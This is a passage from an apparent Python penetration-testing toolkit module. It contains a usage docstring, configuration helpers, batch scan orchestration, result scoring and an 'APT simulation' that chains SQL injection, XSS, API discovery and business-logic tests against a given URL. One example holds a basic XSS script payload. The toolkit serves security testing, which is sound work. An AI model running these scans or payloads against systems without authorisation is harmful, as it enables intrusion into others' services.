=== CORE TESTING FUNCTIONS ===

SQL INJECTION:
- sql_injection_test(url, parameter="id", payload=None, test_type="basic")
- sqlmap_campaign(url, options=None)

CROSS-SITE SCRIPTING:
- xss_test(url, parameter="search", payload=None, test_type="basic")

NETWORK RECONNAISSANCE:
- nmap_scan(target, scan_type="basic", ports=None)
- port_scan(host, ports, scan_timeout=5)

API SECURITY:
- api_endpoint_discovery(base_url, wordlist=None)
- jwt_vulnerability_test(token)

ADVANCED VULNERABILITIES:
- idor_test(endpoint, parameter, test_values=None)
- business_logic_test(url, workflow_steps, test_type="basic")
- command_injection_test(url, parameter="cmd", payload=None)
- xxe_test(url, xml_parameter="data", payload=None)
- information_disclosure_test(url)

=== USAGE EXAMPLES ===

# Basic SQL injection testing
result = sql_injection_test("https://example.com/login", "username")

# Comprehensive XSS testing with custom payload
result = xss_test(
    "https://example.com/search", 
    "query", 
    "<script>alert('XSS')</script>", 
    "comprehensive"
)

# Network reconnaissance
result = nmap_scan("192.168.1.1", "comprehensive")

# API security assessment
endpoints = api_endpoint_discovery("https://api.example.com")
jwt_vulns = jwt_vulnerability_test("eyJhbGciOiJIUzI1NiJ9...")

# Advanced business logic testing
result = business_logic_test(
    "https://shop.example.com/checkout",
    [{"price": "100", "quantity": "1"}],
    "comprehensive"
)

=== CONFIGURATION ===

Configure global settings using VAPT_CONFIG:
VAPT_CONFIG['timeout'] = 60
VAPT_CONFIG['debug'] = True
VAPT_CONFIG['output_dir'] = './custom_results'

=== RETURN FORMAT ===

All functions return VAPTResult objects with:
- success: bool
- tool_name: str
- vulnerabilities: List[Dict]
- execution_time: float
- business_impact: str
- cvss_score: float
- compliance_risk: str
- metadata: Dict
"""

# ===== CONFIGURATION MANAGEMENT =====

def configure_vapt(config_updates: Dict[str, Any]) -> Dict[str, Any]:
    """
    Update global VAPT configuration
    
    Args:
        config_updates: Dictionary of configuration updates
    
    Returns:
        Updated configuration dictionary
    """
    global VAPT_CONFIG
    VAPT_CONFIG.update(config_updates)
    
    # Ensure output directory exists
    Path(VAPT_CONFIG['output_dir']).mkdir(parents=True, exist_ok=True)
    
    return VAPT_CONFIG.copy()

def get_vapt_config() -> Dict[str, Any]:
    """Get current VAPT configuration"""
    return VAPT_CONFIG.copy()

def reset_vapt_config() -> Dict[str, Any]:
    """Reset VAPT configuration to defaults"""
    global VAPT_CONFIG
    VAPT_CONFIG = {
        'timeout': 30,
        'output_dir': './vapt_results',
        'debug': False,
        'max_threads': 10,
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    return VAPT_CONFIG.copy()

# ===== BATCH TESTING FUNCTIONS =====

def run_comprehensive_scan(target_url: str, scan_config: Dict[str, Any] = None) -> Dict[str, VAPTResult]:
    """
    Run comprehensive security scan with multiple test types
    
    Args:
        target_url: Target URL for testing
        scan_config: Configuration for scan types to run
    
    Returns:
        Dictionary of test results by test type
    """
    if not scan_config:
        scan_config = {
            'sql_injection': True,
            'xss': True,
            'api_discovery': True,
            'information_disclosure': True,
            'network_scan': False  # Requires hostname/IP extraction
        }
    
    results = {}
    
    try:
        # SQL Injection Testing
        if scan_config.get('sql_injection', False):
            results['sql_injection'] = sql_injection_test(target_url, test_type="comprehensive")
        
        # XSS Testing
        if scan_config.get('xss', False):
            results['xss'] = xss_test(target_url, test_type="comprehensive")
        
        # API Discovery
        if scan_config.get('api_discovery', False):
            results['api_discovery'] = api_endpoint_discovery(target_url)
        
        # Information Disclosure
        if scan_config.get('information_disclosure', False):
            results['information_disclosure'] = information_disclosure_test(target_url)
        
        # Command Injection
        if scan_config.get('command_injection', False):
            results['command_injection'] = command_injection_test(target_url)
        
        # XXE Testing
        if scan_config.get('xxe', False):
            results['xxe'] = xxe_test(target_url)
        
        # Network Scanning (if hostname can be extracted)
        if scan_config.get('network_scan', False):
            parsed_url = urlparse(target_url)
            if parsed_url.hostname:
                results['network_scan'] = nmap_scan(parsed_url.hostname, "comprehensive")
        
    except Exception as e:
        logging.error(f"Error in comprehensive scan: {e}")
    
    return results

def analyze_results_batch(results: Dict[str, VAPTResult]) -> Dict[str, Any]:
    """
    Analyze batch test results and provide summary
    
    Args:
        results: Dictionary of VAPTResult objects
    
    Returns:
        Analysis summary with risk assessment
    """
    analysis = {
        'total_tests': len(results),
        'successful_tests': 0,
        'total_vulnerabilities': 0,
        'max_cvss_score': 0.0,
        'risk_categories': {},
        'business_impact_summary': {},
        'compliance_risks': set()
    }
    
    for test_name, result in results.items():
        if result.success:
            analysis['successful_tests'] += 1
            analysis['total_vulnerabilities'] += len(result.vulnerabilities)
            
            if result.cvss_score > analysis['max_cvss_score']:
                analysis['max_cvss_score'] = result.cvss_score
            
            # Categorize by severity
            for vuln in result.vulnerabilities:
                severity = vuln.get('severity', 'Unknown')
                analysis['risk_categories'][severity] = analysis['risk_categories'].get(severity, 0) + 1
            
            # Business impact analysis
            if result.business_impact:
                impact_level = result.business_impact.split(' - ')[0] if ' - ' in result.business_impact else result.business_impact
                analysis['business_impact_summary'][impact_level] = analysis['business_impact_summary'].get(impact_level, 0) + 1
            
            # Compliance risks
            if result.compliance_risk:
                analysis['compliance_risks'].add(result.compliance_risk)
    
    # Convert set to list for JSON serialization
    analysis['compliance_risks'] = list(analysis['compliance_risks'])
    
    # Calculate overall risk level
    if analysis['max_cvss_score'] >= 9.0:
        analysis['overall_risk'] = 'CRITICAL'
    elif analysis['max_cvss_score'] >= 7.0:
        analysis['overall_risk'] = 'HIGH'
    elif analysis['max_cvss_score'] >= 4.0:
        analysis['overall_risk'] = 'MEDIUM'
    else:
        analysis['overall_risk'] = 'LOW'
    
    return analysis

# ===== EXPERT TESTING ORCHESTRATION =====

def execute_apt_simulation(target_url: str, attack_complexity: str = "HIGH") -> VAPTResult:
    """
    Execute Advanced Persistent Threat simulation
    
    Args:
        target_url: Target for APT simulation
        attack_complexity: Complexity level (HIGH, EXPERT)
    
    Returns:
        VAPTResult with APT simulation findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        # Phase 1: Reconnaissance
        recon_result = information_disclosure_test(target_url)
        vulnerabilities.extend(recon_result.vulnerabilities)
        
        # Phase 2: Initial Access (XSS + SQL Injection)
        xss_result = xss_test(target_url, test_type="comprehensive")
        vulnerabilities.extend(xss_result.vulnerabilities)
        
        sql_result = sql_injection_test(target_url, test_type="comprehensive")
        vulnerabilities.extend(sql_result.vulnerabilities)
        
        # Phase 3: Privilege Escalation (API Testing)
        api_result = api_endpoint_discovery(target_url)
        vulnerabilities.extend(api_result.vulnerabilities)
        
        # Phase 4: Persistence (Business Logic)
        if attack_complexity == "EXPERT":
            logic_result = business_logic_test(target_url, [{"action": "admin"}])
            vulnerabilities.extend(logic_result.vulnerabilities)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="APT Simulation",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'attack_complexity': attack_complexity,
                'phases_completed': 4 if attack_complexity == "EXPERT" else 3,
                'target_url': target_url
            },
            business_impact="CATASTROPHIC - Multi-vector attack simulation demonstrates complete compromise potential",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Complete security framework failure - ISO 27001, NIST, PCI DSS violations"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="APT Simulation",
            error=str(e),
            execution_time=time.time() - start_time
        )

# ===== UTILITY FUNCTIONS FOR INTEGRATION =====

def list_available_functions() -> List[Dict[str, str]]:
    """
    Get list of all available VAPT functions with descriptions
    
    Returns:
        List of function information dictionaries
    """
    functions = [
        {
            'name': 'sql_injection_test',
            'category': 'injection',
            'description': 'Comprehensive SQL injection testing with multiple techniques',
            'business_impact': 'CRITICAL - Database compromise'
        },
        {
            'name': 'sqlmap_campaign', 
            'category': 'injection',
            'description': 'Advanced SQLMap integration for expert-level SQL testing',
            'business_impact': 'CRITICAL - Advanced database exploitation'
        },
        {
            'name': 'xss_test',
            'category': 'injection',
            'description': 'Cross-site scripting testing with advanced payloads',
            'business_impact': 'HIGH - Client-side code execution'
        },
        {
            'name': 'nmap_scan',
            'category': 'reconnaissance',
            'description': 'Network reconnaissance and port scanning',
            'business_impact': 'MEDIUM - Network exposure analysis'
        },
        {
            'name': 'port_scan',
            'category': 'reconnaissance', 
            'description': 'Custom port scanning functionality',
            'business_impact': 'MEDIUM - Service discovery'
        },
        {
            'name': 'api_endpoint_discovery',
            'category': 'api_security',
            'description': 'Intelligent API endpoint enumeration',
            'business_impact': 'HIGH - API attack surface mapping'
        },
        {
            'name': 'jwt_vulnerability_test',
            'category': 'api_security',
            'description': 'Comprehensive JWT security assessment',
            'business_impact': 'CRITICAL - Authentication bypass'
        },
        {
            'name': 'idor_test',
            'category': 'authorization',
            'description': 'Insecure Direct Object Reference testing',
            'business_impact': 'HIGH - Unauthorized data access'
        },
        {
            'name': 'business_logic_test',
            'category': 'business_logic',
            'description': 'Business workflow and logic vulnerability testing',
            'business_impact': 'CRITICAL - Financial manipulation'
        },
        {
            'name': 'command_injection_test',
            'category': 'injection',
            'description': 'Operating system command injection testing',
            'business_impact': 'CRITICAL - System compromise'
        },
        {
            'name': 'xxe_test',
            'category': 'injection',
            'description': 'XML External Entity vulnerability testing',
            'business_impact': 'CRITICAL - File disclosure and SSRF'
        },
        {
            'name': 'information_disclosure_test',
            'category': 'information_disclosure',
            'description': 'Comprehensive information leakage assessment',
            'business_impact': 'HIGH - Sensitive data exposure'
        },
        {
            'name': 'run_comprehensive_scan',
            'category': 'orchestration',
            'description': 'Execute multiple test types in coordinated scan',
            'business_impact': 'VARIES - Complete security assessment'
        },
        {
            'name': 'execute_apt_simulation',
            'category': 'advanced',
            'description': 'Advanced Persistent Threat attack simulation',
            'business_impact': 'CATASTROPHIC - Multi-vector compromise'
        }
    ]
    
    return functions

def get_function_by_category(category: str) -> List[Dict[str, str]]:
    """
    Get functions filtered by category
    
    Args:
        category: Function category to filter by
    
    Returns:
        List of functions in the specified category
    """
    all_functions = list_available_functions()
    return [func for func in all_functions if func['category'] == category]

# ===== EXPORT CONFIGURATION =====

__all__ = [
    # Core testing functions
    'sql_injection_test', 'sqlmap_campaign', 'xss_test',
    'nmap_scan', 'port_scan', 'api_endpoint_discovery', 'jwt_vulnerability_test',
    'idor_test', 'business_logic_test', 'command_injection_test', 
    'xxe_test', 'information_disclosure_test',
    
    # Orchestration functions
    'run_comprehensive_scan', 'execute_apt_simulation', 'analyze_results_batch',
    
    # Configuration functions
    'configure_vapt', 'get_vapt_config', 'reset_vapt_config',
    
    # Utility functions
    'list_available_functions', 'get_function_by_category',
    'setup_logging', 'create_session', 'save_results',
    
    # Data structures
    'VAPTResult', 'PayloadLibrary',
    
    # Global configuration
    'VAPT_CONFIG'
]

# Initialize logging on module import
logger = setup_logging(VAPT_CONFIG.get('debug', False))
logger.info("Elite VAPT Function Toolkit initialized successfully")
logger.info(f"Available functions: {len(list_available_functions())}")
logger.info(f"Tool availability: nmap={NMAP_CLI_AVAILABLE}, crypto={CRYPTOGRAPHY_AVAILABLE}")

# Ensure output directory exists
Path(VAPT_CONFIG['output_dir']).mkdir(parents=True, exist_ok=True)